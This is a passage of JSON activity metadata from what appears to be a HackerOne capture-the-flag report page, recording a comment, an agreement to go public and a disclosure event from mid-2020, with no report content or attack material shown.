you!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-19T13:42:38.786Z","updated_at":"2020-06-19T13:42:38.786Z","actor":{"username":"shakedko","cleared":false,"url":"/shakedko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8344642,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-19T16:11:07.663Z","updated_at":"2020-06-19T16:11:07.663Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8516343,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-06T16:02:30.957Z","updated_at":"2020-07-06T16:02:30.957Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}